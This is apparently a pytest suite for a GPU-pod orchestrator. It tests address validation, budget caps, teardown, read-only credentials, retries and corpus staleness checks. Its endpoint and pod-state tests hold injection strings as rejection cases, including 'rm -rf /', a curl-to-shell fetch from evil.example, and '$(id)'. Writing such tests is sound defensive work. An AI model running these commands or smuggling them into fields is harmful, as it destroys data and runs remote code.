"""Safety tests for the RunPod orchestrator.

These cover the controls that stand between an unsupervised run and either a
runaway bill or a shell injection. None of them provisions anything.
"""
from __future__ import annotations

import json
from pathlib import Path
from typing import Any
from unittest.mock import patch

import pytest

from scripts.phase0.runpod_provision import validate_ssh_endpoint


@pytest.fixture
def _public_corpus(monkeypatch):
    """Run as if the licensed overlay were absent.

    create_pod now narrows the tier list to SECURE whenever the overlay is on
    disk, so a test that exercises a legitimate COMMUNITY landing has to say it
    is the public-corpus case. Without this the test fails on any checkout that
    has the overlay staged -- which tract/staleness.py notes is every real run.
    """
    from scripts.phase0 import runpod_provision
    monkeypatch.setattr(runpod_provision, "require_secure_cloud", lambda: False)



class TestValidateSshEndpoint:
    """publicIp and portMappings come from a remote API and reach shell=True."""

    def test_accepts_a_normal_endpoint(self) -> None:
        assert validate_ssh_endpoint("203.0.113.7", 22041) == ("203.0.113.7", 22041)

    def test_accepts_ipv6(self) -> None:
        ip, port = validate_ssh_endpoint("2001:db8::1", 22)
        assert port == 22

    @pytest.mark.parametrize("hostile", [
        "203.0.113.7; rm -rf /",
        "203.0.113.7 && curl evil.example/x | sh",
        "$(id)",
        "`id`",
        "203.0.113.7'\"",
        "evil.example.com",
        "",
    ])
    def test_rejects_anything_that_is_not_an_address(self, hostile: str) -> None:
        with pytest.raises(ValueError, match="not an IP address"):
            validate_ssh_endpoint(hostile, 22)

    @pytest.mark.parametrize("port", [0, -1, 65536, 999999])
    def test_rejects_out_of_range_ports(self, port: int) -> None:
        with pytest.raises(ValueError, match="out-of-range SSH port"):
            validate_ssh_endpoint("203.0.113.7", port)


class TestBudgetGate:
    """The $1000 ceiling used to exist only in prose."""

    def test_refuses_a_fleet_that_would_exceed_the_budget(self) -> None:
        from scripts.phase1b import runpod_parallel as rp

        # $50/hr/pod x 5 pods x 6h = $1500, over the $1000 budget.
        with patch.object(rp, "get_gpu_price", return_value=50.0):
            with pytest.raises(RuntimeError, match="Refusing to provision"):
                rp._check_budget("NVIDIA H100 80GB HBM3", 5)

    def test_allows_a_fleet_within_the_budget(self) -> None:
        from scripts.phase1b import runpod_parallel as rp

        with patch.object(rp, "get_gpu_price", return_value=3.0):
            budget = rp._check_budget("NVIDIA H100 80GB HBM3", 5)
        assert budget["usd_per_hour_per_pod"] == 3.0
        assert budget["fleet_usd_per_hour"] == 15.0
        # Priced against the wall time the timeouts actually permit, not the
        # declared cap: the gate was unreachable when priced on MAX_RUN_HOURS.
        assert budget["worst_case_usd"] == pytest.approx(15.0 * budget["reachable_hours"])
        assert budget["reachable_hours"] > rp.MAX_RUN_HOURS
        assert budget["worst_case_usd"] <= budget["budget_usd"]

    def test_unknown_price_is_not_treated_as_free(self) -> None:
        from scripts.phase0 import runpod_provision as rpp

        with patch.object(rpp, "_gql", return_value={"gpuTypes": [{"lowestPrice": {}}]}):
            with pytest.raises(RuntimeError, match="no on-demand price"):
                rpp.get_gpu_price("NVIDIA H100 80GB HBM3")

    def test_price_ceiling_rejects_an_expensive_part(self) -> None:
        """The old fallback was largest-VRAM-wins, at any price."""
        from scripts.phase0 import runpod_provision as rpp

        gpus = [{"id": "SOME-GIANT-GPU", "memoryInGb": 192, "communityCloud": True}]
        with patch.object(rpp, "list_available_gpus", return_value=gpus), \
                patch.object(rpp, "get_gpu_price", return_value=99.0):
            with pytest.raises(RuntimeError, match="within \\$12"):
                rpp.find_fastest_available(min_vram_gb=48, max_usd_per_hour=12.0)


class TestTeardownIsScoped:

    def test_terminate_pods_reports_failures_and_continues(self) -> None:
        """One unreachable pod must not strand the rest."""
        from scripts.phase0 import runpod_provision as rpp

        killed: list[str] = []

        def _terminate(pod_id: str) -> None:
            if pod_id == "bad":
                raise RuntimeError("api down")
            killed.append(pod_id)

        with patch.object(rpp, "terminate_pod", side_effect=_terminate):
            failed = rpp.terminate_pods(["a", "bad", "c"])

        assert killed == ["a", "c"]
        assert failed == ["bad"]

    def test_teardown_keeps_state_when_a_pod_survives(self, tmp_path) -> None:
        """The state file is the only local record of what is still billing."""
        from scripts.phase1b import runpod_parallel as rp

        state_file = tmp_path / ".pod_state.json"
        state_file.write_text(json.dumps({
            "pods": [{"pod_id": "p1", "ip": "203.0.113.7", "port": 22, "role": "A"}],
            "meta": {"state": "running"},
        }))

        with patch.object(rp, "POD_STATE_FILE", state_file), \
                patch.object(rp, "terminate_pods", return_value=["p1"]):
            with pytest.raises(RuntimeError, match="still billing"):
                rp.teardown()

        assert state_file.exists(), "state file must survive a failed teardown"
        assert json.loads(state_file.read_text())["meta"]["still_running"] == ["p1"]

    def test_teardown_removes_state_on_success(self, tmp_path) -> None:
        from scripts.phase1b import runpod_parallel as rp

        state_file = tmp_path / ".pod_state.json"
        state_file.write_text(json.dumps({
            "pods": [{"pod_id": "p1", "ip": "203.0.113.7", "port": 22, "role": "A"}],
            "meta": {},
        }))

        with patch.object(rp, "POD_STATE_FILE", state_file), \
                patch.object(rp, "terminate_pods", return_value=[]):
            rp.teardown()

        assert not state_file.exists()


class TestPodState:

    def test_reads_the_legacy_bare_list_format(self, tmp_path) -> None:
        """An older state file must still be readable, to tear its pods down."""
        from scripts.phase1b import runpod_parallel as rp

        state_file = tmp_path / ".pod_state.json"
        state_file.write_text(json.dumps(
            [{"pod_id": "p1", "ip": "203.0.113.7", "port": 22, "role": "A"}]
        ))
        with patch.object(rp, "POD_STATE_FILE", state_file):
            assert len(rp._read_pod_state()["pods"]) == 1

    def test_load_revalidates_endpoints_from_disk(self, tmp_path) -> None:
        from scripts.phase1b import runpod_parallel as rp

        state_file = tmp_path / ".pod_state.json"
        state_file.write_text(json.dumps({
            "pods": [{"pod_id": "p1", "ip": "evil; rm -rf /", "port": 22, "role": "A"}],
            "meta": {},
        }))
        with patch.object(rp, "POD_STATE_FILE", state_file):
            with pytest.raises(ValueError, match="not an IP address"):
                rp._load_pod_state()


class TestNoCredentialsOnPods:
    """Pods get exactly one credential, and it is read-only.

    This asserted that pods carried NO credential at all, on the reasoning
    that the base model is public and fetches anonymously. The canary
    disproved the premise: HuggingFace rate-limits anonymous fetches per IP
    (HTTP 429) and a fleet exhausts the quota, so a token is required. The
    rule is therefore narrowed rather than dropped -- read-only only, and
    never the two credentials that would actually hurt.
    """

    def _env(self, monkeypatch: pytest.MonkeyPatch) -> dict[str, str]:
        from scripts.phase1b import runpod_parallel as rp

        monkeypatch.setattr(rp, "_get_hf_read_token", lambda: "hf_readonly_stub")
        return rp._get_pod_env()

    def test_the_wandb_key_never_reaches_a_pod(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Logging runs on the operator's machine precisely so it need not."""
        assert "WANDB_API_KEY" not in self._env(monkeypatch)

    def test_the_write_scoped_hf_token_is_never_read(self) -> None:
        """`pass huggingface/token` carries repo.write to the published model.

        Shipping it to a rented host to download a public model would trade a
        credential that can overwrite the release for a convenience.
        """
        source = Path("scripts/phase1b/runpod_parallel.py").read_text(
            encoding="utf-8"
        )
        assert '"huggingface/token"' not in source
        assert 'HF_READ_TOKEN_ENTRY: Final[str] = "huggingface/read-token"' in source

    def test_the_hf_token_comes_from_the_read_only_entry(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from scripts.phase1b import runpod_parallel as rp

        calls: list[list[str]] = []

        class _Result:
            stdout = "hf_readonly_stub"

        def _fake_run(cmd: list[str], **kwargs: object) -> _Result:
            calls.append(cmd)
            return _Result()

        monkeypatch.setattr(rp.subprocess, "run", _fake_run)
        assert rp._get_hf_read_token() == "hf_readonly_stub"
        assert calls == [["pass", "huggingface/read-token"]]

    def test_a_missing_read_token_names_the_fix(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """And says not to substitute the write token."""
        from scripts.phase1b import runpod_parallel as rp

        def _absent(*args: object, **kwargs: object) -> None:
            raise FileNotFoundError("pass entry missing")

        monkeypatch.setattr(rp.subprocess, "run", _absent)
        with pytest.raises(RuntimeError) as excinfo:
            rp._get_hf_read_token()
        message = str(excinfo.value)
        assert "read-token" in message
        assert "repo.write" in message

    def test_the_cache_stays_on_the_volume(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """A multi-gigabyte cache does not belong on the container disk."""
        assert self._env(monkeypatch)["HF_HOME"].startswith("/workspace/")


class TestImagePinning:

    def test_image_is_digest_pinned(self) -> None:
        from scripts.phase1b import runpod_parallel as rp

        assert "@sha256:" in rp.DOCKER_IMAGE, (
            "a mutable tag lets the image change under the run"
        )


class TestPartialProvisioningDoesNotLeak:
    """A fleet that half-comes-up must not leave the half billing.

    create_pods_parallel called future.result() directly, so the first
    exception propagated while the other futures were still creating pods.
    Those pods were created, billed, and recorded nowhere -- the caller never
    received a list, so the state file still said "provisioning" with zero
    pods. This is not hypothetical: RunPod ran out of H100 capacity mid-fleet
    on 2026-08-14 and left three pods orphaned.
    """

    def _configs(self, n: int) -> list[dict[str, str]]:
        return [{"name": f"pod{i}", "role": f"fold{i}"} for i in range(n)]

    def test_successful_pods_are_terminated_when_one_fails(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from scripts.phase0 import runpod_provision as rp

        terminated: list[list[str]] = []

        def _create(gpu_type_id, name, **kwargs):
            if name == "pod2":
                raise RuntimeError("no instances currently available")
            return {"pod_id": f"id-{name}", "ip": "1.2.3.4", "port": 22}

        monkeypatch.setattr(rp, "create_pod", _create)
        monkeypatch.setattr(rp, "terminate_pods",
                            lambda ids: terminated.append(sorted(ids)) or [])

        with pytest.raises(RuntimeError, match="failed to create"):
            rp.create_pods_parallel(self._configs(4), "H100", max_workers=4)

        assert terminated == [["id-pod0", "id-pod1", "id-pod3"]]

    def test_the_error_names_the_first_failure(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from scripts.phase0 import runpod_provision as rp

        def _create(gpu_type_id, name, **kwargs):
            raise RuntimeError("no instances currently available")

        monkeypatch.setattr(rp, "create_pod", _create)
        monkeypatch.setattr(rp, "terminate_pods", lambda ids: [])

        with pytest.raises(RuntimeError) as excinfo:
            rp.create_pods_parallel(self._configs(2), "H100", max_workers=2)

        message = str(excinfo.value)
        assert "2 of 2" in message
        assert "no instances currently available" in message

    def test_a_termination_failure_is_reported_not_swallowed(
        self, monkeypatch: pytest.MonkeyPatch, caplog: pytest.LogCaptureFixture
    ) -> None:
        """A pod that will not die is the one the operator must hear about."""
        from scripts.phase0 import runpod_provision as rp

        def _create(gpu_type_id, name, **kwargs):
            if name == "pod1":
                raise RuntimeError("boom")
            return {"pod_id": f"id-{name}", "ip": "1.2.3.4", "port": 22}

        monkeypatch.setattr(rp, "create_pod", _create)
        monkeypatch.setattr(rp, "terminate_pods", lambda ids: ["id-pod0"])

        with caplog.at_level("ERROR"), pytest.raises(RuntimeError):
            rp.create_pods_parallel(self._configs(2), "H100", max_workers=2)

        assert "STILL BILLING" in caplog.text

    def test_a_fully_successful_fleet_terminates_nothing(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from scripts.phase0 import runpod_provision as rp

        terminated: list[list[str]] = []
        monkeypatch.setattr(rp, "create_pod", lambda g, name, **k: {
            "pod_id": f"id-{name}", "ip": "1.2.3.4", "port": 22,
        })
        monkeypatch.setattr(rp, "terminate_pods",
                            lambda ids: terminated.append(ids) or [])

        pods = rp.create_pods_parallel(self._configs(3), "H100", max_workers=3)

        assert terminated == []
        assert [p["role"] for p in pods] == ["fold0", "fold1", "fold2"]


class TestTransientSshRetry:
    """All five pods of a live fleet lost SSH at once on 2026-08-14 with
    "kex_exchange_identification: Connection reset by peer" -- the transport
    was refused before authentication. Without a retry that ended a campaign
    whose pods were already paid for.
    """

    def test_connection_reset_is_retried(self) -> None:
        from scripts.phase1b.runpod_parallel import _is_transient_ssh_failure

        assert _is_transient_ssh_failure(
            "kex_exchange_identification: read: Connection reset by peer"
        )

    def test_other_transport_failures_are_retried(self) -> None:
        from scripts.phase1b.runpod_parallel import _is_transient_ssh_failure

        for stderr in (
            "ssh: connect to host 1.2.3.4 port 22: Connection refused",
            "ssh: connect to host 1.2.3.4 port 22: Operation timed out",
            "Connection closed by remote host",
            "client_loop: send disconnect: Broken pipe",
        ):
            assert _is_transient_ssh_failure(stderr), stderr

    def test_authentication_failure_is_not_retried(self) -> None:
        """A wrong key fails identically every time; retrying only delays it."""
        from scripts.phase1b.runpod_parallel import _is_transient_ssh_failure

        assert not _is_transient_ssh_failure("Permission denied (publickey).")

    def test_host_key_failure_is_not_retried(self) -> None:
        from scripts.phase1b.runpod_parallel import _is_transient_ssh_failure

        assert not _is_transient_ssh_failure(
            "Host key verification failed. Connection reset by peer"
        )

    def test_ordinary_command_failure_is_not_retried(self, ) -> None:
        """Exit 1 from a command that ran is a result, not a transport fault.

        Re-running it could repeat a side effect, so it must surface as-is.
        """
        from scripts.phase1b.runpod_parallel import _is_transient_ssh_failure

        assert not _is_transient_ssh_failure("ModuleNotFoundError: No module named x")

    def test_retry_happens_and_then_succeeds(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from scripts.phase1b import runpod_parallel as rp

        calls = {"n": 0}

        class _R:
            def __init__(self, rc: int, err: str) -> None:
                self.returncode, self.stdout, self.stderr = rc, "", err

        def _run(*args: object, **kwargs: object) -> _R:
            calls["n"] += 1
            if calls["n"] < 3:
                return _R(255, "kex_exchange_identification: Connection reset by peer")
            return _R(0, "")

        monkeypatch.setattr(rp.subprocess, "run", _run)
        monkeypatch.setattr(rp.time, "sleep", lambda s: None)
        monkeypatch.setattr(rp, "_require_ssh_key", lambda: None)

        result = rp._ssh("1.2.3.4", 22, "true")

        assert calls["n"] == 3
        assert result.returncode == 0

    def test_a_persistent_transport_failure_still_raises(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from scripts.phase1b import runpod_parallel as rp

        class _R:
            returncode, stdout = 255, ""
            stderr = "kex_exchange_identification: Connection reset by peer"

        monkeypatch.setattr(rp.subprocess, "run", lambda *a, **k: _R())
        monkeypatch.setattr(rp.time, "sleep", lambda s: None)
        monkeypatch.setattr(rp, "_require_ssh_key", lambda: None)

        with pytest.raises(RuntimeError, match="SSH command failed"):
            rp._ssh("1.2.3.4", 22, "true")


class TestRsyncToRetries:
    """Sending the tree is idempotent, so a transient failure should retry.

    A single rsync failure during bootstrap took down two pods of a five-pod
    fleet mid-campaign. _rsync_from already retried; this direction did not.
    """

    def test_a_transient_failure_is_retried(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import subprocess as sp

        from scripts.phase1b import runpod_parallel as rp

        calls = {"n": 0}

        def _run(cmd, **kwargs):
            calls["n"] += 1
            if calls["n"] < 2:
                raise sp.CalledProcessError(255, cmd)
            return None

        monkeypatch.setattr(rp.subprocess, "run", _run)
        monkeypatch.setattr(rp.time, "sleep", lambda s: None)

        rp._rsync_to("1.2.3.4", 22, "/local/", "/remote/")
        assert calls["n"] == 2

    def test_a_persistent_failure_still_raises(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import subprocess as sp

        from scripts.phase1b import runpod_parallel as rp

        def _run(cmd, **kwargs):
            raise sp.CalledProcessError(255, cmd)

        monkeypatch.setattr(rp.subprocess, "run", _run)
        monkeypatch.setattr(rp.time, "sleep", lambda s: None)

        with pytest.raises(sp.CalledProcessError):
            rp._rsync_to("1.2.3.4", 22, "/local/", "/remote/")

    def test_success_sends_once(self, monkeypatch: pytest.MonkeyPatch) -> None:
        from scripts.phase1b import runpod_parallel as rp

        calls = {"n": 0}
        monkeypatch.setattr(rp.subprocess, "run",
                            lambda cmd, **k: calls.__setitem__("n", calls["n"] + 1))
        rp._rsync_to("1.2.3.4", 22, "/local/", "/remote/")
        assert calls["n"] == 1


class TestHungSshIsRetried:
    """A hung session produces no returncode, so the stderr-marker check
    never sees it. One pod's bootstrap hung silently -- the pod stayed
    reachable for new connections while the original session was a zombie --
    and blocked the whole fleet's bootstrap barrier until the one-hour
    default timeout.
    """

    def test_a_timeout_is_retried_then_succeeds(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import subprocess as sp

        from scripts.phase1b import runpod_parallel as rp

        calls = {"n": 0}

        class _R:
            returncode, stdout, stderr = 0, "", ""

        def _run(*args: object, **kwargs: object) -> _R:
            calls["n"] += 1
            if calls["n"] == 1:
                raise sp.TimeoutExpired(cmd="ssh", timeout=900)
            return _R()

        monkeypatch.setattr(rp.subprocess, "run", _run)
        monkeypatch.setattr(rp.time, "sleep", lambda s: None)
        monkeypatch.setattr(rp, "_require_ssh_key", lambda: None)

        assert rp._ssh("1.2.3.4", 22, "true").returncode == 0
        assert calls["n"] == 2

    def test_a_persistent_hang_still_raises(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import subprocess as sp

        from scripts.phase1b import runpod_parallel as rp

        def _run(*args: object, **kwargs: object) -> None:
            raise sp.TimeoutExpired(cmd="ssh", timeout=900)

        monkeypatch.setattr(rp.subprocess, "run", _run)
        monkeypatch.setattr(rp.time, "sleep", lambda s: None)
        monkeypatch.setattr(rp, "_require_ssh_key", lambda: None)

        with pytest.raises(sp.TimeoutExpired):
            rp._ssh("1.2.3.4", 22, "true")

    def test_bootstrap_uses_the_shorter_ceiling(self) -> None:
        """An hour is the wrong bound for a 2-4 minute install."""
        from scripts.phase1b import runpod_parallel as rp

        assert rp.SSH_BOOTSTRAP_TIMEOUT_S < rp.SSH_DEFAULT_TIMEOUT_S
        source = Path("scripts/phase1b/runpod_parallel.py").read_text(
            encoding="utf-8"
        )
        bootstrap = source.split("def _bootstrap_pod")[1].split("\ndef ")[0]
        # Every SSH call in bootstrap carries the bounded timeout.
        assert bootstrap.count("SSH_BOOTSTRAP_TIMEOUT_S") == bootstrap.count("_ssh(")


class TestOneFoldFailureDoesNotAbortTheFleet:
    """P2. A credential read that raised became a failed fleet, not a failed fold.

    `_run_fold_on_pod` called `_get_pod_env()` one line above its own `try`,
    and `run_folds` called `f.result()` with no guard. `_get_pod_env` shells
    out to `pass`, which raises RuntimeError on any failure.

    The trigger is not exotic. Five worker threads invoke `pass` at the same
    instant when the folds launch. The GPG agent serialises decryption and
    cannot run pinentry from a non-tty worker thread, so an expired agent
    cache races all five against the same ten-second timeout. One raise ends
    the `as_completed` loop, discards the other four futures' results, and
    reaches full_pipeline's `finally` with results_are_safe still False: five
    GPUs keep billing and four folds that were about to succeed are abandoned.

    The bootstrap loop twenty lines above already caught for exactly this
    reason. The fold loop did not get the same treatment -- and the bootstrap
    loop still raced the same five `pass` calls, so catching there only
    converted the race into "every pod failed to bootstrap".
    """

    ROLES = ("MITRE ATLAS", "NIST AI 100-2", "OWASP AI Exchange")

    def _fleet(self, monkeypatch, run_fold, env_calls=None):
        from scripts.phase1b import runpod_parallel as rpp

        pods = [{"role": r, "ip": "1.2.3.4", "port": 22, "pod_id": f"id-{r}"}
                for r in self.ROLES]
        monkeypatch.setattr(rpp, "_load_pod_state", lambda: pods)
        monkeypatch.setattr(rpp, "_check_deadline", lambda: None)
        monkeypatch.setattr(rpp, "_extend_deadline", lambda: None)
        monkeypatch.setattr(rpp, "fold_roster", lambda split="test": list(self.ROLES))
        monkeypatch.setattr(rpp, "_bootstrap_pod", lambda *a, **k: None)

        def _env() -> dict[str, str]:
            if env_calls is not None:
                env_calls.append(1)
            return {"HF_TOKEN": "hf_read_only"}

        monkeypatch.setattr(rpp, "_get_pod_env", _env)
        monkeypatch.setattr(rpp, "_run_fold_on_pod", run_fold)
        # run_folds enforces the corpus gate before it reads the pod roster.
        # These tests are about fold failure handling, and CI is a fresh clone
        # with no overlay, so the real check would refuse here for an unrelated
        # reason. TestCorpusCompletenessIsEnforcedBeforeSpend owns that gate.
        monkeypatch.setattr(
            rpp, "assert_corpus_matches_training_links", lambda: "d" * 64,
        )
        return rpp

    def test_a_fold_that_raises_becomes_a_failed_fold(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        def _run_fold(pod, config_name, arm_flags=(), split="test", env=None):
            if pod["role"] == "NIST AI 100-2":
                raise RuntimeError("pass: gpg-agent decryption timed out")
            return {"fold": pod["role"], "status": "ok", "elapsed_s": 1.0}

        rpp = self._fleet(monkeypatch, _run_fold)

        failed = rpp.run_folds("cfg")

        assert failed == ["NIST AI 100-2"]

    def test_the_other_folds_still_report_their_results(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The four survivors are the whole point of catching."""
        def _run_fold(pod, config_name, arm_flags=(), split="test", env=None):
            if pod["role"] == "MITRE ATLAS":
                raise RuntimeError("pass: gpg-agent decryption timed out")
            return {"fold": pod["role"], "status": "ok", "elapsed_s": 1.0}

        rpp = self._fleet(monkeypatch, _run_fold)

        failed = rpp.run_folds("cfg")

        assert sorted(failed) == ["MITRE ATLAS"]

    def test_the_credential_is_read_once_on_the_main_thread(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """One `pass` invocation instead of five concurrent ones removes the race."""
        env_calls: list[int] = []

        def _run_fold(pod, config_name, arm_flags=(), split="test", env=None):
            return {"fold": pod["role"], "status": "ok", "elapsed_s": 1.0}

        rpp = self._fleet(monkeypatch, _run_fold, env_calls=env_calls)

        rpp.run_folds("cfg")

        assert len(env_calls) == 1

    def test_every_fold_receives_the_hoisted_environment(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Hoisting must hand the env down, not silently drop the token."""
        seen: list[dict[str, str] | None] = []

        def _run_fold(pod, config_name, arm_flags=(), split="test", env=None):
            seen.append(env)
            return {"fold": pod["role"], "status": "ok", "elapsed_s": 1.0}

        rpp = self._fleet(monkeypatch, _run_fold)

        rpp.run_folds("cfg")

        assert len(seen) == len(self.ROLES)
        assert all(e == {"HF_TOKEN": "hf_read_only"} for e in seen)


class TestCollectVerifiesThePayload:
    """P3. A collected fold and an empty directory looked the same.

    `collect` recorded a role as failed only when `_rsync_from` raised. An
    rsync against a directory that exists and holds no fold record exits 0,
    so it was counted as collected.

    The path to unrecoverable loss: a fold exits 0 without writing
    fold_result.json, so failed_folds is empty and uncollected is empty,
    full_pipeline sets results_are_safe = True, teardown() runs, and the pods
    are destroyed. `aggregate` then fails with nothing left to re-run and the
    GPU hours already spent.

    Verifying the payload rather than the transport is the whole point of the
    function.
    """

    def _collect(self, monkeypatch, tmp_path, roles, payload):
        from scripts.phase1b import runpod_parallel as rpp

        pods = [{"role": r, "ip": "1.2.3.4", "port": 22} for r in roles]
        monkeypatch.setattr(rpp, "_load_pod_state", lambda: pods)
        monkeypatch.setattr(rpp, "RESULTS_DIR", tmp_path)

        def _rsync(ip: str, port: int, remote: str, local: str) -> None:
            # rsync exits 0 whether or not the remote directory held anything.
            for role, body in payload.items():
                if body is None:
                    continue
                d = Path(local) / f"fold_{role.replace(' ', '_')}"
                d.mkdir(parents=True, exist_ok=True)
                (d / "fold_result.json").write_text(body, encoding="utf-8")

        monkeypatch.setattr(rpp, "_rsync_from", _rsync)
        return rpp

    def test_an_rsync_that_moved_nothing_is_not_a_collected_fold(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        roles = ["MITRE ATLAS", "NIST AI 100-2"]
        rpp = self._collect(monkeypatch, tmp_path, roles, {
            "MITRE ATLAS": json.dumps({"framework": "MITRE ATLAS"}),
            "NIST AI 100-2": None,
        })

        failed = rpp.collect("cfg")

        assert failed == ["NIST AI 100-2"]

    def test_a_fold_result_that_does_not_parse_is_not_collected(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """A truncated transfer leaves a file that exists and is not JSON."""
        roles = ["MITRE ATLAS", "NIST AI 100-2"]
        rpp = self._collect(monkeypatch, tmp_path, roles, {
            "MITRE ATLAS": json.dumps({"framework": "MITRE ATLAS"}),
            "NIST AI 100-2": '{"framework": "NIST AI 100-2", "hit',
        })

        failed = rpp.collect("cfg")

        assert failed == ["NIST AI 100-2"]

    def test_a_complete_fleet_collects_cleanly(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """The check must not invent failures on a good run."""
        roles = ["MITRE ATLAS", "NIST 800-53 v5"]
        rpp = self._collect(monkeypatch, tmp_path, roles, {
            r: json.dumps({"framework": r}) for r in roles
        })

        assert rpp.collect("cfg") == []

    def test_a_transport_failure_is_still_a_failure(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """The payload check adds to the rsync check, it does not replace it."""
        from scripts.phase1b import runpod_parallel as rpp

        pods = [{"role": r, "ip": "1.2.3.4", "port": 22}
                for r in ("MITRE ATLAS", "NIST AI 100-2")]
        monkeypatch.setattr(rpp, "_load_pod_state", lambda: pods)
        monkeypatch.setattr(rpp, "RESULTS_DIR", tmp_path)

        def _rsync(ip: str, port: int, remote: str, local: str) -> None:
            raise RuntimeError("rsync: connection unexpectedly closed")

        monkeypatch.setattr(rpp, "_rsync_from", _rsync)

        assert sorted(rpp.collect("cfg")) == ["MITRE ATLAS", "NIST AI 100-2"]


class TestCorpusCompletenessIsEnforcedBeforeSpend:
    """The refusal that never fired.

    `assert_corpus_matches_training_links` is written as a refusal -- its own
    docstring opens "Refuse to train against a corpus the training links were
    not built from" -- and until 2026-08-26 nothing called it. It appeared in
    the Jetson briefing as a checklist row and in its own tests, and nowhere
    on any path that trains.

    What it guards is not cosmetic. A clone without the gitignored overlay
    trains on 4,048 of the 4,389 links, because 341 belong to the three overlay
    frameworks whose prose is deliberately not in git (dsomm 213, iso_27001
    92, etsi 36). That is 7.8% of the training set, and the run reports the
    same figures in the same shape. Nothing in the output says so. csa_ccm's
    29 links joined the tracked corpus on 2026-08-26.

    A checklist row is not a gate. This is the gate.
    """

    ROLES = ("MITRE ATLAS", "NIST AI 100-2")

    def _fleet(self, monkeypatch, submitted):
        from scripts.phase1b import runpod_parallel as rpp

        pods = [{"role": r, "ip": "1.2.3.4", "port": 22, "pod_id": f"id-{r}"}
                for r in self.ROLES]
        monkeypatch.setattr(rpp, "_load_pod_state", lambda: pods)
        monkeypatch.setattr(rpp, "_check_deadline", lambda: None)
        monkeypatch.setattr(rpp, "_extend_deadline", lambda: None)
        monkeypatch.setattr(rpp, "fold_roster", lambda split="test": list(self.ROLES))
        monkeypatch.setattr(rpp, "_bootstrap_pod", lambda *a, **k: None)
        monkeypatch.setattr(rpp, "_get_pod_env", lambda: {"HF_TOKEN": "t"})

        def _run_fold(pod, config_name, arm_flags=(), split="test", env=None):
            submitted.append(pod["role"])
            return {"fold": pod["role"], "status": "ok", "elapsed_s": 1.0}

        monkeypatch.setattr(rpp, "_run_fold_on_pod", _run_fold)
        return rpp

    def test_a_partial_corpus_stops_the_run_before_any_fold(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from tract.training.data_quality import CorpusMismatchError

        submitted: list[str] = []
        rpp = self._fleet(monkeypatch, submitted)

        def _mismatch() -> str:
            raise CorpusMismatchError("corpus digest differs from the recorded one")

        monkeypatch.setattr(rpp, "assert_corpus_matches_training_links", _mismatch)

        with pytest.raises(CorpusMismatchError):
            rpp.run_folds("cfg")

        # The whole point is that no GPU hour is spent discovering this.
        assert submitted == []

    def test_a_complete_corpus_runs_normally(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The gate must not stop a good run."""
        submitted: list[str] = []
        rpp = self._fleet(monkeypatch, submitted)
        monkeypatch.setattr(
            rpp, "assert_corpus_matches_training_links", lambda: "deadbeef",
        )

        assert rpp.run_folds("cfg") == []
        assert sorted(submitted) == sorted(self.ROLES)

    def test_a_missing_sidecar_also_stops_the_run(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """No sidecar means nothing to check against, which is not a pass."""
        submitted: list[str] = []
        rpp = self._fleet(monkeypatch, submitted)

        def _absent() -> str:
            raise FileNotFoundError("hub_links_training.meta.json is absent")

        monkeypatch.setattr(rpp, "assert_corpus_matches_training_links", _absent)

        with pytest.raises(FileNotFoundError):
            rpp.run_folds("cfg")
        assert submitted == []


class TestStaleResultsCannotBecomeAHeadlineNumber:
    """load_fold_results checks that folds agree with EACH OTHER, not with now.

    It refuses a partial fold set, mixed arms, mixed input digests and mixed
    git SHAs. Every one of those compares folds against their siblings. None
    of them asks whether the corpus those digests describe is the corpus on
    disk today.

    So five folds that are uniformly stale pass every existing check and
    aggregate into a number that reads as current. That is not hypothetical:
    A1 and A2 sit in this repository right now with five validation folds
    each, they look complete, and the corpus rebuild moved under them. The
    briefing's rule is that a stale result may be compared against its own
    recorded inputs and may not be quoted as a current measurement. This makes
    the second half enforceable instead of advisory.
    """

    def _results_dir(self, tmp_path: Path, digests: list[dict[str, str]]) -> Path:
        d = tmp_path / "cfg"
        for i, inputs in enumerate(digests):
            fold = d / f"fold_{i}"
            fold.mkdir(parents=True)
            (fold / "fold_result.json").write_text(
                json.dumps({"held_out_framework": f"fw{i}", "inputs": inputs}),
                encoding="utf-8",
            )
        return d

    def _current(self) -> dict[str, str]:
        """Digests that match the files on disk right now."""
        import hashlib

        from tract.staleness import TRACKED_INPUTS

        out = {}
        for field, path in TRACKED_INPUTS.items():
            if path.exists():
                out[field] = hashlib.sha256(path.read_bytes()).hexdigest()
        return out

    def test_a_stale_fold_refuses_to_aggregate(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        from scripts.phase1b import runpod_parallel as rpp

        stale = dict(self._current())
        stale["all_controls_sha256"] = "0" * 64
        d = self._results_dir(tmp_path, [stale])

        with pytest.raises(RuntimeError, match="stale"):
            rpp._assert_results_are_current(d, allow_stale=False)

    def test_current_folds_pass(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        """The gate must not stop a fresh run."""
        from scripts.phase1b import runpod_parallel as rpp

        d = self._results_dir(tmp_path, [self._current(), self._current()])

        rpp._assert_results_are_current(d, allow_stale=False)

